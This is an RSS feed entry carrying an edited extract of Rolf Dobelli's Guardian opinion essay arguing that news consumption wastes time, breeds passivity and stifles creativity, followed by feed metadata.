&lt;p&gt;&lt;strong&gt;News works like a drug.&lt;/strong&gt; As stories develop, we want to know how they continue. With hundreds of arbitrary storylines in our heads, this craving is increasingly compelling and hard to ignore. Scientists used to think that the dense connections formed among the 100 billion neurons inside our skulls were largely fixed by the time we reached adulthood. Today we know that this is not the case. Nerve cells routinely break old connections and form new ones. The more news we consume, the more we exercise the neural circuits devoted to skimming and multitasking while ignoring those used for reading deeply and thinking with profound focus. Most news consumers – even if they used to be avid book readers – have lost the ability to absorb lengthy articles or books. After four, five pages they get tired, their concentration vanishes, they become restless. It's not because they got older or their schedules became more onerous. It's because the physical structure of their brains has changed.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News wastes time.&lt;/strong&gt; If you read the newspaper for 15 minutes each morning, then check the news for 15 minutes during lunch and 15 minutes before you go to bed, then add five minutes here and there when you're at work, then count distraction and refocusing time, you will lose at least half a day every week. Information is no longer a scarce commodity. But attention is. You are not that irresponsible with your money, reputation or health. Why give away your mind?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News makes us passive.&lt;/strong&gt; News stories are overwhelmingly about things you cannot influence. The daily repetition of news about things we can't act upon makes us passive. It grinds us down until we adopt a worldview that is pessimistic, desensitised, sarcastic and fatalistic. The scientific term is &quot;learned helplessness&quot;. It's a bit of a stretch, but I would not be surprised if news consumption, at least partially contributes to the widespread disease of depression.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News kills creativity.&lt;/strong&gt; Finally, things we already know limit our creativity. This is one reason that mathematicians, novelists, composers and entrepreneurs often produce their most creative works at a young age. Their brains enjoy a wide, uninhabited space that emboldens them to come up with and pursue novel ideas. I don't know a single truly creative mind who is a news junkie – not a writer, not a composer, mathematician, physician, scientist, musician, designer, architect or painter. On the other hand, I know a bunch of viciously uncreative minds who consume news like drugs. If you want to come up with old solutions, read news. If you are looking for new solutions, don't.&lt;/p&gt;
&lt;p&gt;Society needs journalism – but in a different way. Investigative journalism is always relevant. We need reporting that polices our institutions and uncovers truth. But important findings don't have to arrive in the form of news. Long journal articles and in-depth books are good, too.&lt;/p&gt;
&lt;p&gt;I have now gone without news for four years, so I can see, feel and report the effects of this freedom first-hand: less disruption, less anxiety, deeper thinking, more time, more insights. It's not easy, but it's worth it.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This is an edited extract from an essay first published at&lt;/em&gt; &lt;a href=&quot;http://dobelli.com/&quot; title=&quot;&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;&lt;em&gt;dobelli.com&lt;/em&gt;&lt;/a&gt;&lt;em&gt;. The Art of Thinking Clearly: Better Thinking, Better Decisions by Rolf Dobelli is published by Sceptre, £9.99. Buy it for £7.99 at&lt;/em&gt; &lt;a href=&quot;http://www.guardianbookshop.co.uk/BerteShopWeb/viewProduct.do?ISBN=9781444759549&quot; title=&quot;&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;&lt;em&gt;guardianbookshop.co.uk&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;


</description>
<pubDate>Thu, 05 Apr 2018 10:52:23 +0000</pubDate>
<dc:creator>Ours90</dc:creator>
<og:url>http://www.theguardian.com/media/2013/apr/12/news-is-bad-rolf-dobelli</og:url>
<og:description>News is bad for you. It leads to fear and aggression. It hinders your creativity and makes you sick. We should stop consuming it, says Rolf Dobelli, who's abstained for years</og:description>
<og:image>https://i.guim.co.uk/img/static/sys-images/Guardian/Pix/pictures/2013/4/12/1365789342841/news-montage-010.jpg?w=1200&amp;h=630&amp;q=55&amp;auto=format&amp;usm=12&amp;fit=crop&amp;crop=faces%2Centropy&amp;bm=normal&amp;ba=bottom%2Cleft&amp;blend64=aHR0cHM6Ly91cGxvYWRzLmd1aW0uY28udWsvMjAxOC8wMS8zMS9mYWNlYm9va19kZWZhdWx0LnBuZw&amp;s=e6534bc091b105efe310da9067351c09</og:image>
<og:type>article</og:type>
<og:title>News is bad for you – and giving up reading it will make you happier</og:title>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.theguardian.com/media/2013/apr/12/news-is-bad-rolf-dobelli</dc:identifier>
</item>
</channel>
</rss>